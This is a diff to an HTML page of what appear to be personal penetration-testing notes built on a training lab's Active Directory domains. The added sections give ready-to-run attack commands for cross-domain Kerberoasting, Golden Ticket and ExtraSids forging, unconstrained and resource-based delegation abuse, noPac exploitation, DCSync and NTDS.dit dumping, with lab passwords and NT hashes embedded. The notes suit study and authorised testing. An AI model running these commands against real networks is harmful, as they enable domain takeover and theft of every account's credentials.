@@ -73,7 +73,9 @@ queryuser RID  #Provides information about a specific user.</code></pre>
                 <h3> BloodHound </h3>
                 <ul>
                 <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
-                <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
+                <pre><code class="language-bash">bloodhound-ce-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
+                <p>In case you are trying to gather information from another subdomain using a user of a different domain you must specify where this user comes from. (-u parameter)</p>
+                <pre><code class="language-bash">bloodhound-ce-python --dns-tcp -ns 172.16.5.238 -d FREIGHTLOGISTICS.LOCAL -u forend@inlanefreight.local -p Klmcargo2 -c all</code></pre>
                 <p>From windows we use sharphound, load it into the box and run it. Then export files</p>
                 <pre><code class="language-bash">.\SharpHound.exe -c All --zipfilename bloodhound.zip</code></pre>   
                 
@@ -81,7 +83,8 @@ queryuser RID  #Provides information about a specific user.</code></pre>
                 <ul>
                     <li> All kerberoasteable users</li>
                     <li> Shortest paths to system trusted for unconstrained delegation (In case you see a user this one can be the entry vector)</li>
-                    <li> Shortest paths to domain admins (In case you see a user this one can be the entry vector)</li> 
+                    <li> Shortest paths to domain admins (In case you see a user this one can be the entry vector)</li>                  
+                    <li>Principals with foreign domain group membership: <b>This one is useful since it show users from principal domain which are members of child domains groups. In case you get that username you'll be able to access the two domains. If it's an admin you won</b></li>  
                 </ul>
 
                 <p> Default groups and users have Object ID over 500 so in case you see and object with priveleges that is not default it may be an entry vector</p>
@@ -270,26 +273,31 @@ lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:proxyagent</code></pre>
                         <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
                         <pre><code class="language-bash">impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request
 impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>
-
+                        <p>In case you are targeting a user in another domain you could do</p>
+                        <pre><code class="language-bash">impacket-GetUserSPNs  -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request</code></pre>
+                        
                         <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                         <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                         <p>Show the hash</p>
                         <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>
-                        
+                        <p>Command in case you are inside a dc or sort of. You'll need powerview.ps1</p>
+                        <pre><code class="language-powershell">Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></pre>
                         <h4>Rubeus.exe</h4>
                         <ul>
                             <p>We can perform the same thing from inside using rubeus.exe There are some useful commands which should be noted</p>
                             <p>Showing stats about the kerberoastable users and the date of last password change</p>
-                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /stats</code></pre>
+                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /stats</code></pre>
                             <p>List all tickets from kerberoastable users</p>
-                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /nowrap</code></pre>
+                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /nowrap</code></pre>
                             <p>Filtering for accounts with admincount=1</p>
-                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></pre>
+                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></pre>
                             <p>Filtering for a single user</p>
-                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap</code></pre>
+                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap</code></pre>
                             <p>Showing only RC4 tickets. Which are the easier ones to crack</p>
-                            <pre><code class="language-bash">.\Rubeus.exe kerberoast /tgtdeleg /nowrap</code></pre>
+                            <pre><code class="language-pwoershell">.\Rubeus.exe kerberoast /tgtdeleg /nowrap</code></pre>
                             <p><b>Important note: You should "always" go for tickets which are in RC4 (type 23) encryption mode since it's quickly to crack them. In case you found AES 128/256 (type 24 and 18) have in mind that this ones are harder to crack and hashcat will take it's time. In order to check which type you are facing you could lok at the property supported Etypes or look at the ticket $krb5tgs$18$ ($krb5tgs$TYPE$)</b></p>
+                            <b>You can also perform it to a child domain</b>
+                            <pre><code class="language-powershell">.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></pre>
                         </ul>
                     </ul>
 
@@ -322,7 +330,30 @@ IT</code></pre>
 
                         <h3>Golden Ticket Attack 📀</h3>
                         <ul>
-                            <p>Under construction</p>
+                            <p>In order to perform this attack you'll need</p>
+                            <p>KRBTGT Account's NTLM Hash</p>
+                            <p>Obviusly you need domain admin on that server to acquire it</p>
+                            <pre><code class="language-bash">secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></pre>
+                            <br>
+
+                            <b>Domain SID</b>
+                            <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></pre>
+
+                            <b>SID of the Admins group</b>
+                            <p>Think that the Enterpise Admins group is only in the root domain so from child domains you won't be able to get it. It is recommended to get it from Windows or by using rpcclient</p>
+                            <p>In case your credentials are not valid in the DC you won't be able to login</p>
+                            <pre><code class="language-bash">ldapsearch -x -H ldap://inlanefreight.local 
+-D "htb-student_adm@inlanefreight.local" -w HTB_@cademy_stdnt_admin! 
+-b "dc=inlanefreight,dc=local" "(cn=Enterprise Admins)" objectSid</code></pre>
+                            <p>Finally perform the attack using ticketer.py</p>
+                            <pre><code class="language-bash">ticketer.py -nthash 9d765b482771505cbe97411065964d5f 
+-domain-sid DOMAIN_SID -domain logistics.inlanefreight.local -extra-sid SID_OF_ADMINS_GROUP hacker
+export KRB5CCNAME=/tmp/hacker.ccache
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 </code></pre>
+                            <b>You can also use this atopwn tool to automate the attack</b>
+                            <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
+                            <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
+                            <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
                         </ul>
 
                         <h3>Diamon Ticket Attack 🔷</h3>
@@ -345,6 +376,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\back
                             
                         </ul>
                         <h4>Workaround #2: Register PSSession Configuration</h4>
+                        <ul>
                         <p>Establish a winrm sesion to remote host</p>
                         <pre><code class="language-bash">Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
                         <p>Import powerview </p>
@@ -355,6 +387,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\back
                         <pre><code class="language-bash">Restart-Service WinRM</code></pre>
                         <p>Establish again a winrm session to remote host and you are done</p>
                         <pre><code class="language-bash">Enter-PSSession -ConfigurationName backupadmsess -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm</code></pre>
+                        </ul>    
                     </ul>
 
                     <h3>Kerberos Constrained Delegation</h3>
@@ -369,6 +402,59 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\back
                         <p>Then you'll see two tickets, the second one is the important, with that ticket imported automatically you can access the dc directly by typing <b>dir \\dc01.inlanefreight.local\C$</b> or use secretsdump.py obviously exporting the ticket previously</p>
                         <pre><code class="language-powershell">secretsdump.py -k -no-pass INLANEFREIGHT/administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
                     </ul>
+
+                    <h3>Kerberos Unconstrained Delegation</h3>
+                    <ul>
+                        <p>This attack consists in a insecure configuration in AD which allows a service to impersonate any user who authenticate against it. The key here is that a computer o an account can be configuted as <b>Trust this computer/user for delegation to any service (Kerberos only)</b></p>
+                        <p>We can list all users/computers configured that way with the following PS command</p>
+                        <pre><code class="language-powershell">Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description</code></pre>
+                        <p>In case we found a computer we will need to login into it. Once there we can execute mimikatz to check if there are tickets in memory</p>
+                        <pre><code class="language-powershell">mimikatz# sekurlsa::tickets</code></pre>
+                        <p>As we won't found no tickets we'll need to access the DC and perform a query to our victim computer in order to force the DC to perform an interaction that will log it's ticket in the victim computer.</p>
+                        <pre><code class="language-powershell">Invoke-WebRequest http://iis01.offense.local -UseDefaultCredentials -UseBasicParsing</code></pre>
+                        <p>We could aso perform a share access which will make to log the ticket in memory</p>
+                        <pre><code class="language-powershell">dir \\ATTACKER\share</code></pre>
+                        <p>Finally repeat the mimikatz command which will list the ticket of the administrator. We can export the ticket by doing</p>
+                        <pre><code class="language-powershell">privilege::debug
+sekurlsa::tickets /export</code></pre>
+                        <p>Looking at the output you'll recieve a .kirbi file with the content of the ticket. Now we can use this ticket to perform pass-the-ticket attack</p>
+                        <pre><code class="language-powershell"> mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\NAME_OF-THE_FILE.kirbi</code></pre>
+                        <p>This will export the ticket so we will be able to access the DC by doing</p>
+                        <pre><code class="language-powershell">dir\\dc01\c$</code></pre>
+                    </ul>
+
+                    <h3>Kerberos Resource-based Constrained Delegation</h3>
+                    <ul>
+                        <p>This attack allows a resource (server) to decide who can impersonate users agains it. The attack goes this way. If I control computer A and i can write AD object of a computer B, i can say to that computer. Trust computer A in order to impersonate any user</p>
+                        <p>To do so, we'll need to check the machine quota </p>
+                        <pre><code class="language-powershell">Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local</code></pre>
+                        <p>We need a DC with at least a Windows server 2012 (Get-DomainController)</p>  
+                        <p>And we need that our target computer don't have the attribute msds-allowedtoactonbehalfofotheridentity set</p>
+                        <pre><code class="language-powershell">Get-NetComputer TARGET_COMPUTERNAME | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity</code></pre>
+                        <h4>Starting the attack</h4>
+                        <p>Let's now create a fake computer</p>
+                        <pre><code class="language-powershell">import-module powermad
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose</code></pre>
+                        <p>Now let's get the SID of that computer. Grab the SID because we'll needed later</p>
+                        <pre><code class="language-powershell">Get-DomainComputer fake01 </code></pre>
+                        <p>Create a new raw security descriptor for the FAKE01</p>
+                        <pre><code class="language-powershell">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)</code></pre>
+                        <p>Now apply the security descriptor bytes to the target machine. Remember to have full control over the target computer. In case we don't have privileges we'll see it</p>
+                        <pre><code class="language-powershell">Get-DomainComputer TARGET_COMPUTERNAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</code></pre>
+                        <p>We can check it by doing</p>
+                        <pre><code class="language-powershell">Get-DomainComputer TARGET_COMPUTERNAME -Properties 'msds-allowedtoactonbehalfofotheridentity'</code></pre>
+                        <p>Even we can check if the security descriptor assigned to the TARGET_COMPUTERNAME refers to fake01$</p> 
+                        <pre><code class="language-powershell">(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl</code></pre>
+                        <h4>Exploitation</h4>
+                        <p>Now let's generate an RC4 hash of the password we set for the fake01 computer</p>
+                        <pre><code class="language-powershell">Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local</code></pre>    
+                        <p>Grab that hash from the rc4_mac field and use it in the following command to impersonate any user</p>
+                        <pre><code class="language-powershell">rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt</code></pre>    
+                        <p>You'll see two tickets and the important one is the second one in case you have it you will be able to list content from that computer</p>
+                        <pre><code class="language-powershell">dir \\TARGET_COMPUTER\C$</code></pre>
+                    </ul>
                 </ul> 
                 
                 <h2 id="NoPac">NoPac</h2>
@@ -382,9 +468,11 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\back
 [*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
 [*] Got TGT from 172.16.5.5. Ticket size 663</code></pre>
                     <p>Now exploiting part:</p>
-                    <pre><code class="language-bash">python3 noPac.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></pre>    
+                    <pre><code class="language-bash">python3 noPac.py inlanefreight.local/forend:Klmcargo2 
+-dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></pre>    
                     <p>Now that the exploit succeed we can try with the following. Obiously you need a domain user and it's credentials. Then you'll get NTLM hash of admin account</p>
-                    <pre><code class="language-bash">python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></pre>
+                    <pre><code class="language-bash">python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  
+-dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></pre>
                     <p>Then you'll get a shell but you won't be able to get out of system32 folder. Even though the ticket from the administrator will be in our power so we can use it to connect</p>
                     <p><b>Remember to add the name of the host to th /etc/hosts in this case (ACADEMY-EA-DC01.inlanefreight.local) </b></p>
                     <pre><code class="language-bash">mv administrator_ACADEMY-EA-DC01.inlanefreight.local.ccache /tmp/admin.ccache</code></pre>
@@ -440,22 +528,91 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\back
 netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></pre>
                 </ul>
 
+                <h2 id="Attacking domain trusts">Attacking domain trusts</h2>
+                <ul>
+                    <p>Trusts can be set up in two directions: one-way or two-way (bidirectional).</p>
+                    <p><b>One-way trust</b>: Users in a trusted domain can access resources in a trusting domain, not vice-versa.</p>
+                    <p><b>Bidirectional trust</b>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.</p>
+                    <h3>Enumeration</h3>
+                    <ul>
+                        <p>List domain trusts</p>
+                        <pre><code class="language-powershell">Get-DomainTrust </code></pre>
+                        <p>Lists users from a domain</p>
+                        <pre><code class="language-powershell">Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></pre>
+                        <b>Using bloodhound's query named Map Domain Trusts can also lists the domains trusts</b>
+                    </ul>
 
+                    <h3>ExtraSids Attack</h3>
+                    <ul>
+                    <p>If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.</p>
+                    <p>SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.</p>
+                    <p>SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain</p>
+                    <p>To perform the attack we need the following:</p>
+                    <h3>From windows</h3>
+                    <ul>
+                    <b>KRBTGT Account's NTLM Hash</b>
+                    <p>We need to perform a dcsync or lsass dump</p>
+                    <p>Using mimikatz...</p>
+                    <pre><code class="language-powershell">mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></pre>
                     
+                    <br>
+                    <b>Domain SID</b>
+                    <pre><code class="language-powershell">Get-DomainSID</code></pre>
 
+                    <br>
+                    <b>SID of the Admins grup</b>
+                    <pre><code class="language-powershell">Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid</code></pre>
                     
+                    <p>We can perform the attack using the mimikatz or rubeus. Remember that youll be creating a new user (in this case hacker)</p>
+                    <b>mimikatz</b>
+                    <ul>
+                        <br>
+                        <pre><code class="language-powershell">mimikatz # 
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL 
+/sid:SID_OF_CHILD_DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:SID_OF_ADMINS_GROUP /ptt</code></pre>
+                        <p>This will automatically export the ticket and youll be able to access directly to the DC since youll be in the Enterprise Admins group</p>
+                    </ul>    
 
-                    
-                    
-                    
-                
+                    <b>Rubeus</b>
+                    <ul>
+                        <br>
+                        <pre><code class="language-powershell">.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f 
+/domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:SID_OF_CHILD_DOMAIN  /sids:SID_OF_ADMINS_GROUP /user:hacker /ptt</code></pre>
+                        <p>This will automatically export the ticket and youll be able to access directly to the DC since youll be in the Enterprise Admins group</p>
+                    </ul> 
 
- 
-                    
+                    <p>Once done you can try to access the domain by doing</p>
+                    <pre><code class="language-powershell">ls \\academy-ea-dc01.inlanefreight.local\c$</code></pre>
+                    <p>And most important we can perform another dcsync to the DC, remember always to specify the domain since it won't work if not</p>
+                    <pre><code class="language-powershell">lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</code></pre>
+                    </ul>
+                    <h3>From linux</h3>
+                    <ul>
+                        <p>KRBTGT Account's NTLM Hash</p>
+                        <p>Obviusly you need domain admin on that server</p>
+                        <pre><code class="language-bash">secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></pre>
+                        <br>
 
-                   
+                        <b>Domain SID</b>
+                        <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></pre>
 
-
+                        <b>SID of the Admins group</b>
+                        <p>Think that the Enterpise Admins group is only in the root domain so from child domains you won't be able to get it. It is recommended to get it from Windows or by using rpcclient</p>
+                        <p>In case your credentials are not valid in the DC you won't be able to login</p>
+                        <pre><code class="language-bash">ldapsearch -x -H ldap://logistics.inlanefreight.local 
+-D "htb-student_adm@logistics.inlanefreight.local" -w HTB_@cademy_stdnt_admin! 
+-b "dc=logistics,dc=inlanefreight,dc=local" "(cn=Enterprise Admins)" objectSid</code></pre>
+                        <p>Finally perform the attack using ticketer.py</p>
+                        <pre><code class="language-bash">ticketer.py -nthash 9d765b482771505cbe97411065964d5f 
+-domain-sid DOMAIN_SID -domain logistics.inlanefreight.local -extra-sid SID_OF_ADMINS_GROUP hacker
+export KRB5CCNAME=/tmp/hacker.ccache
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></pre>
+                        <b>You can also use this atopwn tool to automate the attack</b>
+                        <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
+                        <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
+                        <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
+                    </ul>
+                    </ul>
                 </ul>
             </ul>        
         </div>
